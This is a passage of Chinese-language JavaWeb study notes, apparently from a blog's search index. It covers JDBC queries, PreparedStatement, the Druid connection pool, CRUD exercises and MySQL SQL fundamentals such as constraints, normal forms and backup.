= resultSet.getInt(1);\n            String string = resultSet.getString(2);\n            double anInt1 = resultSet.getDouble(3);\n\n            int id = resultSet.getInt(\"id\");\n            String name = resultSet.getString(\"name\");\n            double money = resultSet.getDouble(\"money\");\n            System.out.println(id + \"---\" + name + \"---\" + money);\n        &#125;\n\n        resultSet.close();\n        statement.close();\n        conn.close();\n    &#125;\n&#125;\n\n\n\n\n\n\n\n\n\n\npojo：用来存放实体类，简单的 java 对象的包\n\n\n\n\n\n\n\n\n\n需求：将数据库中的数据封装为 account 对象，并存储到集合中\n@Test\npublic void testResultSet2() throws Exception &#123;\n    Class.forName(\"com.mysql.jdbc.Driver\");\n    String url = \"jdbc:mysql://127.0.0.1:3306/db3?useSSL=false\";\n    String username = \"root\";\n    String password = \"root\";\n    Connection conn = DriverManager.getConnection(url, username, password);\n\n    Statement statement = conn.createStatement();\n    String sql = \"SELECT * FROM ACCOUNT\";\n\n    ResultSet resultSet = statement.executeQuery(sql);\n\n    //创建一个集合\n    List&lt;Account> list = new ArrayList&lt;>();\n    while (resultSet.next()) &#123;\n        Account account = new Account();\n        //获取数据\n        int id = resultSet.getInt(\"id\");\n        String name = resultSet.getString(\"name\");\n        double money = resultSet.getDouble(\"money\");\n\n        //设置数据\n        account.setId(id);\n        account.setName(name);\n        account.setMoney(money);\n\n        //向列表内添加数据\n        list.add(account);\n    &#125;\n\n    System.out.println(list);\n    resultSet.close();\n    statement.close();\n    conn.close();\n&#125;\n# 3.5 PreparedStatement\n\nPreparedStatement 作用：\n\n预编译 SQL 语句并执行：预防 SQL 注入问题\n\n\nSQL 注入：\n\nSQL 注入是通过操作输入来修改事先定义好的 SQL 语句，用以达到执行代码对服务器进行攻击的方法\n\n\n\n\n获取 PreparedStatement 对象\n\n//SQL语句中的参数值，使用？占位符替代\nString sql = \"select * from user where username = ? and password = ?\";\n//通过Connection对象获取，并传入对应的SQL语句\nPreparedStatement pstmt = conn.preparedStatement(sql);\n\n设置参数值\n\nPreparedStatement对象：setXxx(参数1，参数2)：给？赋值\nXxx：数据类型,如setInt(参数1，参数2)\n参数：\n    参数1：？的位置编号，从1开始\n    参数2：？的值\n\n执行 SQL\n\nexecuteUpdate();/executeQuery(); 不需要再传递SQL\npackage com.itheima.jdbc;\n\nimport org.junit.Test;\n\nimport java.sql.*;\n\npublic class JDBCDemo5_PreparedStatement &#123;\n    /**\n     * PreparedStatement\n     * @throws Exception\n     */\n    @Test\n    public void testPreparedStatement() throws Exception &#123;\n        Class.forName(\"com.mysql.jdbc.Driver\");\n\n        String url = \"jdbc:mysql:///db3?useSSL=false&amp;useServerPrepStmts=true\";\n        String username = \"root\";\n        String password = \"root\";\n        Connection connection = DriverManager.getConnection(url, username, password);\n\n        //设置sql，用？代替参数的位置\n        String sql = \"SELECT * FROM EMP WHERE ID = ?\";\n        //获取PreparedStatement，传递SQL\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        //设置参数\n        preparedStatement.setInt(1,2);\n        //执行\n        ResultSet resultSet = preparedStatement.executeQuery();\n        while (resultSet.next()) &#123;\n            int id = resultSet.getInt(\"id\");\n            String name = resultSet.getString(\"name\");\n            String gender = resultSet.getString(\"gende\");\n            double salary = resultSet.getDouble(\"salary\");\n            Date join_date = resultSet.getDate(\"join_date\");\n            int dept_id = resultSet.getInt(\"dept_id\");\n            System.out.println(id);\n            System.out.println(name);\n            System.out.println(gender);\n            System.out.println(salary);\n            System.out.println(join_date);\n            System.out.println(dept_id);\n            System.out.println(\"------------------\");\n        &#125;\n    &#125;\n&#125;\n\n要使用预编译功能，在获取连接的 url 里要使用键值对 useServerPrepStmts=true  手动开启，默认是关闭的\n配置 MySQL 执行日志（my.ini，重启 mysql 服务后生效）\n\n\n\n\n\n\n\n\n\n\nlog-output=FILE\ngeneral-log=1\ngeneral_log_file=“D:\\mysql.log”\nslow-query-log=1\nslow_query_log_file=“D:\\mysql_slow.log”\nlong_query_time=2\n# 4、数据库连接池\n\n数据链接池简介\nDruid 数据库连接池\n\n# 4.1 数据库连接池简介\n\n数据库连接池是个容器，负责分配、管理数据库连接（connection）\n它允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个\n释放空闲时间超过最大空闲时间的数据库连接来避免因为没有释放数据库连接而引起的数据库连接遗漏\n好处：\n\n资源重用\n提升系统响应速度\n避免数据库连接遗漏\n\n\n\n# 4.2 数据库连接池实现\n\n标准接口：DataSource\n\n官方（SUN）提供的数据库连接池标准接口，由第三方组织实现此接口\n功能：获取连接\n\n\n\nConnection getConnection();\n\n常见的数据库连接池：\n\nDBCP\nC3P0\nDruid\n\n\nDruid (德鲁伊)：\n\nDruid 连接池是阿里巴巴开源的数据库连接池项目\n功能强大，性能优秀，是 Java 语言最好的数据库连接池之一\n\n\n\n# 4.3 Druid 使用步骤\n\n导入 jar 包\n定义配置文件\n加载配置文件\n获取数据库连接池对象\n获取连接\n\npackage com.itheima.druid;\n\nimport com.alibaba.druid.pool.DruidDataSourceFactory;\n\nimport javax.sql.DataSource;\nimport java.io.FileInputStream;\nimport java.sql.Connection;\nimport java.util.Properties;\n\n/**\n * Druid数据库连接池演示\n */\npublic class DruidDemo &#123;\n    public static void main(String[] args) throws Exception &#123;\n        //1.导入jar包\n        //2.定义配置文件\n        //3.加载配置文件\n        Properties prop = new Properties();\n        prop.load(new FileInputStream(\"src/druid.properties\"));\n        //4.获取连接池对象\n        DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);\n        //5.获取对应数据库连接\n        Connection connection = dataSource.getConnection();\n        System.out.println(connection);\n        //获取当前工作路径，用来判断导入文件时的路径\n        System.out.println(System.getProperty(\"user.dir\"));\n    &#125;\n&#125;\n# 练习\n完成商品品牌数据的增删改查操作\n\n\n查询：查询所有数据\n\n\n添加：添加品牌\n\n\n修改：根据 id 修改\n\n\n删除：根据 id 删除\n\n\n准备环境：\n\n数据库表：tb_\tbrand\n实体类 Brand\n测试用例\n\n\n\n# 1、查询所有数据\n\n获取 Connection\n定义 SQL：select * from tb_brand;\n获取 PreparedStetement 对象\n设置参数：不需要\n执行 SQL\n处理结果：List&lt;Brand&gt;\n释放资源\n\npackage example;\n\nimport com.alibaba.druid.pool.DruidDataSourceFactory;\nimport com.itheima.pojo.Brand;\nimport org.junit.Test;\n\nimport javax.sql.DataSource;\nimport java.io.FileInputStream;\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Properties;\n\npublic class BrandTest &#123;\n    /**\n     * 查询所有\n     * 核心思想：\n     * 1.select * from tb_brand;\n     * 2.参数：不需要\n     * 3.结果：Lsit&lt;Brand>\n     */\n    @Test\n    public void testSelectAll() throws Exception &#123;\n        //1.获取Connection\n        Properties prop = new Properties();\n        prop.load(new FileInputStream(\"src/druid.properties\"));\n        DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);\n        Connection connection = dataSource.getConnection();\n        System.out.println(connection);\n        //2.定义SQL语句\n        String sql = \"select * from tb_brand;\";\n        //3.获取PreparedStatement对象\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        //4.设置参数——无参数\n        //5.执行SQL\n        ResultSet resultSet = preparedStatement.executeQuery();\n        //6.处理结果\n        List&lt;Brand> brands = new ArrayList&lt;>();\n        Brand brand = null;\n        while (resultSet.next()) &#123;\n            Integer id = resultSet.getInt(\"id\");\n            String brandName = resultSet.getString(\"brand_name\");\n            String companyName = resultSet.getString(\"company_name\");\n            Integer ordered = resultSet.getInt(\"ordered\");\n            String description = resultSet.getString(\"description\");\n            Integer status = resultSet.getInt(\"status\");\n            brand = new Brand();\n            brand.setId(id);\n            brand.setBrandName(brandName);\n            brand.setCompanyName(companyName);\n            brand.setOrdered(ordered);\n            brand.setDescription(description);\n            brand.setStatus(status);\n            brands.add(brand);\n        &#125;\n        //7.释放资源\n        resultSet.close();\n        preparedStatement.close();\n        connection.close();\n\n        System.out.println(brands);\n    &#125;\n&#125;\n# 2、添加数据\n\n编写 SQL 语句\n是否需要参数？需要，除了 ID 之外的所有参数\n返回结果如何封装？boolean\n\n@Test\n    public void testAdd() throws Exception &#123;\n        //接收页面提交的参数\n        String brandName = \"香飘飘\";\n        String companyName = \"香飘飘\";\n        int ordered = 1;\n        String description = \"绕地球一圈\";\n        int status = 1;\n\n        //1.获取Connection\n        Properties prop = new Properties();\n        prop.load(new FileInputStream(\"src/druid.properties\"));\n        DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);\n        Connection connection = dataSource.getConnection();\n        System.out.println(connection);\n        //2.定义SQL语句\n        String sql = \"insert into tb_brand(brand_name,company_name,ordered,description,status) values(?,?,?,?,?)\";\n        //3.获取PreparedStatement对象\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        //4.设置参数\n        preparedStatement.setString(1,brandName);\n        preparedStatement.setString(2,companyName);\n        preparedStatement.setInt(3,ordered);\n        preparedStatement.setString(4,description);\n        preparedStatement.setInt(5,status);\n        //5.执行SQL\n        int count = preparedStatement.executeUpdate();\n        //6.处理结果\n        System.out.println(count > 0);\n        //7.释放资源\n        preparedStatement.close();\n        connection.close();\n    &#125;\n# 3、根据 ID 修改\n\n编写 sql 语句\n是否需要参数？需要：Brand 对象所有数据\n返回结果如何封装？boolean\n\n@Test\npublic void testUpdate() throws Exception &#123;\n    //接收页面提交的参数\n    String brandName = \"香飘飘\";\n    String companyName = \"香飘飘\";\n    int ordered = 1000;\n    String description = \"绕地球三圈\";\n    int status = 1;\n    int id = 4;\n\n    //1.获取Connection\n    Properties prop = new Properties();\n    prop.load(new FileInputStream(\"src/druid.properties\"));\n    DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);\n    Connection connection = dataSource.getConnection();\n    System.out.println(connection);\n    //2.定义SQL语句\n    String sql = \"update tb_brand set brand_name=?,company_name=?,ordered=?,description=?,status=? where id=?;\";\n    //3.获取PreparedStatement对象\n    PreparedStatement preparedStatement = connection.prepareStatement(sql);\n    //4.设置参数\n    preparedStatement.setString(1,brandName);\n    preparedStatement.setString(2,companyName);\n    preparedStatement.setInt(3,ordered);\n    preparedStatement.setString(4,description);\n    preparedStatement.setInt(5,status);\n    preparedStatement.setInt(6,id);\n    //5.执行SQL\n    int count = preparedStatement.executeUpdate();\n    //6.处理结果\n    System.out.println(count > 0);\n    //7.释放资源\n    preparedStatement.close();\n    connection.close();\n&#125;\n# 4、根据 ID 修改\n\n编写 SQL 语句\n是否需要参数？需要，id\n返回结果如何处理？boolean\n\n@Test\npublic void testDelete() throws Exception &#123;\n    Properties prop = new Properties();\n    prop.load(new FileInputStream(\"src/druid.properties\"));\n    DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);\n    Connection connection = dataSource.getConnection();\n\n    String sql = \"delete from tb_brand where id=?;\";\n\n    PreparedStatement preparedStatement = connection.prepareStatement(sql);\n    preparedStatement.setInt(1,4);\n    int i = preparedStatement.executeUpdate();\n    System.out.println(i > 0);\n    preparedStatement.close();\n    connection.close();\n&#125;\n","slug":"JavaWeb-JDBC","date":"2022-06-22T12:55:59.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"bd2363725236602d9ed430e1445ce7eb","title":"JavaWeb-数据库","content":"JavaWeb - 数据库\n# 1、数据库的相关概念\n\n数据库\n数据库管理系统\nSQL\n常见的关系型数据库管理系统\n\n数据库：\n\n存储数据的仓库，数据是有组织进行存储\n英文：DataBase，简称 DB\n\n数据库管理系统：\n\n管理数据库的大型软件\n英文：DataBase Management System，简称 DBMS\n\nSQL：\n\n英文：Structured Query Language，简称 SQL，结构化查询语言\n操作关系型数据库的语言\n定义操作所有关系型数据库的统一标准\n每一种数据库的操作方式存在不一样的地方，称为 “方言”\n\n常见的关系型数据库管理系统：\n\nOracle：收费，且非常昂贵，金融银行使用 Oracle 的居多\nMySQL：开源的免费的中小型数据库，在互联网公司使用的非常多\nSQL Server：微软的收费数据库，在 Java 中使用的不多\nPostgreSQL：开源中小型数据库\nDB2：IBM 公司的大型收费数据库产品\nSQLite：嵌入式的微型数据库，如：作为 Android 内置数据库\nMariaDB：开源免费中小型数据库\n\n\n\n\n\n\n\n\n\n\n本次只学习 MySQL，对于后续的其他数据库，都是使用 SQL 操作的，而且 SQL 可以操作市面上所有的关系型数据库\n# 2、MySQL 数据库\n\nMySQL 安装\nMySQL 卸载\nMySQL 配置\nMySQL 登录、退出\n\n安装、登录、卸载、配置等参见安装手册\n\nMySQL 数据模型\n\nMySQL 数据库模型：\n\n关系型数据库\n\n关系型数据库是建立在关系模型基础上的数据库，简单说，关系型数据库是由多张能够相互连接的二维表组成的数据库\n优点：\n\n都是使用表结构，格式一致，易于维护\n使用通用的 SQL 语言操作，使用方便，可用于复杂查询\n数据存储在磁盘中，安全（存在硬盘中就是持久化存储）\n\n\n\n\n不通过表存取的就是非关系型数据库\n数据库是通过文件夹实现的，MySQL 的数据存放在 data 目录下，每个文件夹对应一个数据库\n\n# 3、SQL 通用语法\n\nSQL 语句可以以单行或多行书写，以分号结尾\n可以使用空格或制表符来提高可读性\nMySQL 数据库的 SQL 语句不区分大小写，但是关键字建议以大写来表示\n3 种注释：\n\n单行注释：– 注释内容  或 #注释内容\n多行注释：/* 注释内容 */\n\n\n\n# 4、SQL 分类\nSQL 语句根据其功能，主要分为四类：DDL、DML、DQL、DCL。 DDL：\nDDL：Data Definition Language 数据定义语言，用来定义数据库对象 (数据库，表， 字段)\nDML：Data Manipulation Language 数据操作语言，用来对数据库表中的数据进行增删改\nDQL： Data Query Language 数据查询语言，用来查询数据库中表的记录\nDCL： Data Control Language 数据控制语言，用来创建数据库用户、控制数据库的访问权限\n\n# 5、DDL：操作数据库、表\n# 5.1 操作数据库：CRUD\n\n\nC (Create)：创建\n\n\n创建数据库：create database 数据库名称；\n\n\n创建数据库，判断是否存在，不存在再创建：create database if not exists 数据库名称；\n\n\n创建数据库，并指定字符集：create database 数据库名称 character set 字符集名；\n\n\n创建一个 db4 的数据库，判断是否存在，并指定字符集为 gbk：create database if not exists db4 character set gbk;\n\n\n\n\nR (Retrieve)：查询\n\n查询所有数据库的名称：show databases;\n查询创建数据库的 SQL 语句、字符集：show create database 数据库名；\n\n\n\nU (Update)：修改\n\n修改数据库的字符集：alter database 数据库名称 character set 字符集名；\n\n\n\nD (Delete)：删除\n\n删除数据库：drop database 数据库名称；\n判断数据库是否存在，存在再删除：drop database if exists 数据库名称；\n\n\n\n使用数据库\n\n查询当前正在使用的数据库名称：select database();\n使用数据库：use 数据库名称；\n\n\n\n# 5.2 操作表：CRUD\n\n\nC (Create)：创建\n\n\n语法：create table 表名 (\n列明 1 数据类型 1,\n列名 2 数据类型 2,\n…\n列明 n 数据类型 n\n);# 注意最后一列不需要加逗号\n\n\n数据类型\n\nint：整数类型\n\nage int,\n\n\ndouble：小数类型\n\nscore double (5,2)_最多有 5 位，小数点后 2 位\n\n\ndate：日期，只包含年月日，yyyy-MM-dd\ndatetime：日期，包含年月日时分秒，yyyy-MM-dd HH:mm:ss\ntimestamp：时间戳类型，包含年月日时分秒，如果将来不给这个字段赋值或赋值为 null，则默认使用当前的系统时间来自动赋值\nvarchar：字符串\n\nname varchar (20)：姓名最大 20 个字符\n\n\n\n\n\n复制一张表，如复制一张 student 为 student1：create table student1 like student;\n\n\n创建一张学生表\n\n\nmysql> create table student(\n    -> id int,\n    -> name varchar(32),\n    -> age int,\n    -> score double(4,1),\n    -> birthday date,\n    -> insert_time timestamp\n    -> );\n\n\nR (Retrieve)：查询\n\n查询某个数据库中所有表的名称：show tables;\n查询表结构：desc 表名称；\n查询表的创建语句：show create table 表名；\n\n\n\nU (Update)：修改\n\n修改表名：alter table 表名 rename to 新表名；\n修改表的字符集：show create table 表名；alter table 表名 character set 新字符集名；\n添加一列：alter table 表名 add 列名 数据类型；\n修改列名称、类型：alter table 表名 change 旧列名 新列明 新数据类型； 或 alter table 表名 modify 列名 新数据类型；\n删除列：alter table 表名 drop 列名；\n\n\n\nD (Delete)：删除\n\n删除表：drop table 表名；\n如果存在，再删除：drop table if exists 表名；\n\n\n\n\n# 6、DML：增删改表中数据\n# 5.1 添加数据\n\n基本语法：insert into 表名 (列名 1, 列明 2,…, 列明 n) values (值 1, 值 2, 值 3,…, 值 n)\n注意：\n\n列明和值要一一对应\n如果表名后不定义列明，则默认给所有列添加值\n除了数字类型，其他类型需要使用引号 (单双引号都可以) 引起来\n\n\n\n# 5.2 删除数据\n\n基本语法：delete from 表名 [where 条件];\n\n删除 id 为 2 的值：delete from stu where id = 2;\n\n\n注意：\n\n如果不加条件，则删除表中所有记录，非常危险不要使用\n如果要删除所有记录，两种方法：\n\ndelete from 表名；-- 不推荐使用，因为有多少条记录就执行多少次指令，效率很低\n**truncate table 表名；** 先删除表，再创建一个和原表一样的空表，推荐使用，效率更高\n\n\n\n\n\n# 5.3 修改数据\n\n基本语法：update 表名 set 列名 1 = 值 1, 列明 2 = 值 2,…, 列明 n = 值 n [where 条件];\n\n将 stu 表内的 id 为 3 的 age 改为 117： UPDATE stu SET age = 117 WHERE id = 3;\n更改多条数据： UPDATE stu SET age = 18, score = 100 WHERE id = 2;\n\n\n注意：\n\n如果不加任何条件，则会将表中所有记录全部修改\n\n\n\n# 7、DQL：查询表中的记录\n\nselect * from 表名；\n\n# 7.1 语法\n\n\n\n\n\n\n\n\n\nselect\n​\t字段列表\nfrom\n​\t表名列表\nwhere\n​\t条件列表\ngroup by\n​\t分组字段\nhaving\n​\t分组之后的条件\norder by\n​\t排序\nlimit\n​\t分页限定\n# 7.2 基础查询\n\n查询多个字段：select 字段名 1, 字段名 2,… 字段名 n from 表名；\n\n注意：如果查询所有字段，则可以使用 * 来替代字段列表\n\n\n\n-- 查询姓名 和 年龄\nSELECT NAME,age FROM student;\nSELECT * FROM student;\n\n去除重复：select distinct 列名 1, 列明 2,… from 表名；\n\n-- 去除重复的结果集\nSELECT DISTINCT address FROM student;\nSELECT DISTINCT NAME,address FROM student;\n#当查询多个字段时，只有两个字段组合的值相同了之后才会去重\n\n计算列：一般可以使用四则运算来计算列的值，一般只会进行数值型的运算\n\nifnull (表达式 1, 表达式 2)：null 参与的运算，计算结果都是 null\n\n表达式 1：哪个字段需要判断是否为 Null\n表达式 2：该字段为 null 则替换后的值\n\n\n\n\n\n-- 计算math 和 English 分数之和\nSELECT NAME,math,english FROM student;\nSELECT NAME,math,english,math+english FROM student;\n-- 如果有null参与的运算,计算结果都为null\nSELECT NAME,math,english,math+IFNULL(english,0) FROM student;\n-- ifnull(a,b)：如果a为null，替换为b\n\n起别名：列名 as 重命名  或  列明 + 空格 + 重命名\n\nas 可以省略，用一个或多个空格代替\n\n\n\n-- 起别名\nSELECT NAME,math,english,math+IFNULL(english,0) AS '总分' FROM student;\nSELECT NAME,math 数学,english 英语,math+IFNULL(english,0) '总分' FROM student;\n# 7.3 条件查询\n\nwhere 子句后跟条件\n运算符\n\n&gt;、&lt;、&lt;=、&gt;=、=、&lt;&gt;\nBETWEEN…AND\nIN (集合)\nLIKE ‘张 %’ ：模糊查询\n\n_：单个任意字符\n%：多个任意字符\n\n\nIS NULL\nand 或 &amp;&amp;\nor 或 ||\nnot 或！\n\n\n\n-- 查询年龄大于20岁\nSELECT * FROM student WHERE age >= 20;\n-- 查询年龄等于20岁\nSELECT * FROM student WHERE age = 20;\n-- 查询年龄不等于20岁\nSELECT * FROM student WHERE age != 20;\nSELECT * FROM student WHERE age &lt;> 20;\n\n-- 查询年龄大于等于20，小于等于30\nSELECT * FROM student WHERE age >= 20 AND age &lt;= 30;\nSELECT * FROM student WHERE age BETWEEN 20 AND 30;\n-- 查询年龄22岁，19岁，25岁的信息\nSELECT * FROM student WHERE age = 22 OR age = 19 OR age = 25;\nSELECT * FROM student WHERE age IN (22,19,25);\n\n-- 查询英语成绩为null （null值不能使用=判断，只能用is null）\nSELECT * FROM student WHERE english IS NULL;\n-- 查询英语成绩不为null\nSELECT * FROM student WHERE english IS NOT NULL;\n\n-- 查询姓马的有哪些\nSELECT * FROM student WHERE NAME LIKE \"马%\";\n-- 查询第二个字是化的人\nSELECT * FROM student WHERE NAME LIKE \"_化%\";\n-- 查询姓名是三个字的人\nSELECT * FROM student WHERE NAME LIKE \"___\";\n-- 查询姓名中包含马的人\nSELECT * FROM student WHERE NAME LIKE \"%马%\";\n# 7.4 排序查询\n\n语法：order by 字句\n\norder by 排序字段 1 排序方式 1, 排序字段 2 排序方式 2 …;\n\n\n排序方式\n\nASC：升序，默认\nDESC：降序\n\n\n注意：\n\n如果有多个排序条件，则当前面的条件值一样时，才会判断第二条件\n\n\n\n-- 按照数学成绩排序\nSELECT * FROM student ORDER BY math ASC;\nSELECT * FROM student ORDER BY math DESC;\n-- 按照数学成绩排名，如果数学成绩一样，则按照英语成绩排名，都是升序\nSELECT * FROM student ORDER BY math ASC, english ASC;\n# 7.5 聚合函数\n\n将一列数据作为一个整体，进行纵向的计算。\n\ncount：计算个数\n\n一般选择非空的列：主键\ncount (*) —— 只要这一行数据有一个不为 null 就算作一个数据\n\n\nmax：计算最大值\nmin：计算最小值\nsum：计算和\navg：计算平均值\n\n\n注意：聚合函数的计算排除了 null 值\n\n解决方案：选择不包含空值的列进行计算，或使用 IFNULL 函数进行计算\n\n\n\n-- 查询学生的人数\nSELECT COUNT(NAME) FROM student;\nSELECT COUNT(IFNULL(english,0)) FROM student;\n-- 数学成绩的最大值和最小值\nSELECT MAX(math) FROM student;\nSELECT MIN(math) FROM student;\n-- 计算数学成绩的和\nSELECT SUM(math) FROM student;\n-- 计算数学成绩的平均值\nSELECT AVG(math) FROM student;\n# 7.6 分组查询\n\n基本语法：group by 分组字段\n注意：\n\n分组之后查询的字段：分组字段、聚合函数，写其他字段没有任何意义\nwhere 和 having 的区别：\n\nwhere 在分组之前进行限定，如果不满足这个条件则不参与分组。having 是在分组之后进行限定，如果不满足结果则不会被查询出来。\nwhere 后不可以跟聚合函数，having 可以进行聚合函数的判断\n\n\n\n\n\n-- 按照性别分组，分别查男女同学的平均分\nSELECT sex,AVG(math) FROM student GROUP BY sex;\n-- 按照性别分组，分别查男女同学的平均分、人数\nSELECT sex,AVG(math),COUNT(id) FROM student GROUP BY sex;\n-- 按照性别分组，分别查男女同学的平均分、人数,要求分数低于70分的不参与分组\nSELECT sex,AVG(math),COUNT(id) FROM student WHERE math > 70 GROUP BY sex;\n-- 按照性别分组，分别查男女同学的平均分、人数,要求分数低于70分的不参与分组,分组之后人数要大于两个人\nSELECT sex,AVG(math),COUNT(id) FROM student WHERE math > 70 GROUP BY sex HAVING COUNT(id)>2;\nSELECT sex,AVG(math),COUNT(id) 人数 FROM student WHERE math > 70 GROUP BY sex HAVING 人数>2;\n# 7.7 分页查询\n\n基本语法：limit 开始的索引，每页查询的条数；\n公式：* 开始的索引 = （当前页码 - 1）每页显示的条数\n分页操作是一个方言\n\n-- 每页显示3条记录 第一页\nSELECT * FROM student LIMIT 0,3;\n-- 每页显示3条记录 第二页\nSELECT * FROM student LIMIT 3,3;\n-- 每页显示3条记录 第三页\nSELECT * FROM student LIMIT 6,3;\n# 8、约束\n\n概念：对表中的数据进行限定，保证数据的正确性、有效性和完整性\n分类：\n\n主键约束：primary key\n非空约束：not null\n唯一约束：unique\n外键约束：foreign key\n\n\n\n# 8.1 非空约束\n\n\n非空约束：not null\n\n\n在创建表的时候添加非空约束\nCREATE TABLE stu (\n    id INT,\n    NAME VARCHAR(20) NOT NULL\n);\n-- 删除name列的非空约束\nALTER TABLE stu MODIFY NAME VARCHAR(40);\n\n\n创建完表后添加非空约束\nALTER TABLE stu MODIFY NAME VARCHAR(40) NOT NULL;\n\n\n\n\n# 8.2 唯一约束\n\n唯一约束：unique，某一列的值不能重复\n注意\n\n唯一约束可以有 null 值，但是只能有一条记录为 null\n\n\n\n\n在创建表的时候添加唯一约束\n\n-- 在创建表时添加唯一约束\nCREATE TABLE stu(\n\tid INT,\n\tphone_number VARCHAR(20) UNIQUE -- 手机号\n);\n\n创建完表后添加唯一约束\n\nALTER TABLE stu MODIFY phone_number VARCHAR(20) UNIQUE;\n\n删除唯一约束\n\nALTER TABLE stu DROP INDEX phone_number;\n# 8.3 主键约束\n\n主键：primary key\n注意\n\n含义：非空且唯一\n一张表中只能有一个主键，可以多个字段组成联合主键\n主键就是表中记录的唯一标识\n\n\n\n\n在创建表时添加主键\n\nCREATE TABLE stu (\n\tid INT PRIMARY KEY,\n\tNAME VARCHAR(20)\n);\n\n删除主键\n\nALTER TABLE stu DROP PRIMARY KEY;\n\n创建完表后添加主键\n\nALTER TABLE stu MODIFY id INT PRIMARY KEY;\n# 8.4 主键约束 - 自动增长\n\n概念：如果某一列是数值类型的，使用 auto_increment 可以完成值的自动增长\n注意\n\n自动增长的值只和上一条的值有关\n自动增长一般会和主键联合使用\n也可以不和主键一起用，但是用的很少\n\n\n\n\n在创建表时添加主键，并完成主键自增长\n\nCREATE TABLE stu (\n\tid INT PRIMARY KEY AUTO_INCREMENT,\n\tNAME VARCHAR(20)\n);\n\n删除自动增长\n\nALTER TABLE stu MODIFY id INT;\n-- 这样不会删除主键，但是可以删除自动增长\n\n创建表完成后添加自动增长\n\nALTER TABLE stu MODIFY id INT PRIMARY KEY AUTO_INCREMENT;\n-- primaey key可加可不加\n# 8.5 外键约束\n\n外键约束：foreign key，让表与表产生关系，从而保证数据的正确性\n\n\n在创建表时添加外键\n\n\n\n\n\n\n\n\n\n\n语法：\ncreate table 表名 (\n​\t…\n​\t外键列\n​\tconstraint 外键名称 foreign key 外键列 references 主表名称 (主表列名称);\n)\nCREATE TABLE employee(\n\tid INT PRIMARY KEY AUTO_INCREMENT,\n\tNAME VARCHAR(20),\n\tage INT,\n\tdep_id INT, -- 外键对应主表的主键\n\tCONSTRAINT emp_dept_id FOREIGN KEY (dep_id) REFERENCES department(id)\n);\n\n删除外键\n\nALTER TABLE 表名 DROP FOREIGN KEY 外键名称;\nALTER TABLE employee DROP FOREIGN KEY emp_dept_id;\n\n在创建表之后添加外键\n\nALTER TABLE 表名称 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名称(主表列明);\nALTER TABLE employee ADD CONSTRAINT emp_dep_id FOREIGN KEY (dep_id) REFERENCES department(id);\n# 8.6 外键约束 - 级联操作\n\n添加外键，设置级联更新\n\n概念：父表的主键在更新时，子表的外键值也跟着更新\n\n\n\nALTER TABLE 表名称 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名称(主表列明) ON UPDATE CASCADE;\n\n添加外键，设置级联删除\n\n概念：父表的主键在删除时，会自动删除子表外键中有该父表主键值的那一行数据\n\n\n\nALTER TABLE 表名称 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名称(主表列明) ON DELETE CASCADE;\n\n级联更新和删除可以在一行内一起使用，如\n\nALTER TABLE 表名称 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名称(主表列明) ON UPDATE CASCADE ON DELETE CASCADE;\n\n实际开发情况中级联的使用是非常谨慎的\n\n# 9、数据库的设计\n\n多表之间的关系\n数据库设计的范式\n\n# 9.1 多表之间的关系\n\n一对一（了解）：\n\n如：人和身份证\n分析：一个人只有一个身份证，一个身份证也只能对应一个人\n\n\n一对多（多对一）：\n\n如：部门和员工\n分析：一个部门有多个员工，一个员工只能对应一个部门\n\n\n多对多：\n\n如：学生和课程\n分析：一个学生可以选择很多课程，一个课程也可以被很多学生选择\n\n\n\n# 9.2 一对多表关系实现\n\n如：部门和员工\n\n\n\n实现方式：在多的地方去建立外键指向 1 的一方的主键\n在员工表里添加一个外键指向部门表的主键\n\n# 9.3 多对多表关系实现\n\n如：学生和课程\n\n\n\n实现方式：借助第三章中间表，中间表至少包含两个字段，分别指向两个表的主键\n两个字段要使用联合主键 ——foreign key (sid,cid);\n\n# 9.4 一对一表关系实现\n\n如：人和身份证\n\n\n\n实现方式：在任何一方添加唯一外键指向另一方的主键\n实际情况中一般会把两张表合成一张表\n\n# 10、范式\n\n概念：在设计数据库时需要遵循的规范。要遵循后边的范式要求，必须先遵循前边的所有范式要求\n分类：\n\n第一范式（1NF）：每一列都是不可分割的原子数据项\n第二范式（2NF）：在第一范式的基础上，非码属性必须完全依赖于候选码（在 1NF 基础上消除非主属性对主码的部分函数依赖 ）\n\n几个概念\n\n函数依赖：A-----&gt;B，如果通过 A 属性（属性组）的值，可以确定唯一 B 属性的值，则称 B 依赖于 A\n完全函数依赖：A-----&gt;B，如果 A 是一个属性组，则 B 属性值的确定需要 A 中所有的属性值\n部分函数依赖：A-----&gt;B，如果 A 是一个属性组，则 B 属性值的确定只需要依赖于 A 属性组中某一些值即可\n传递函数依赖：A-----&gt;B，B-----&gt;C，如果通过 A 属性（属性组）的值，可以确定唯一 B 属性的值，再通过 B 属性（属性组）的值可以确定唯一 C 属性的值，则称 C 传递函数依赖于 A\n码：如果在一张表中，一个属性或属性组被其他所有属性所完全依赖，则称这个属性（属性组）为该表的码\n主属性：码属性组中的所有属性\n非主属性：除去码属性组的属性\n\n\n\n\n第三范式（3NF）：在 2NF 的基础上，任何非主属性不依赖于其他非主属性（在 2NF 基础上消除传递依赖）\n\n\n\n# 11、数据库的备份和还原\n# 11.1 命令行\n备份：\nmysqldump -u用户名 -p密码 数据库名 > 保存的路径\n还原：\n1. 登录数据库\n2. 创建数据库\n3. 使用数据库\n4. 执行文件，source 文件路径\n# 11.2 图形化工具\n\n根据使用的工具进行导出和导入\n\n# 12、多表查询\n\n笛卡尔积：由两个集合 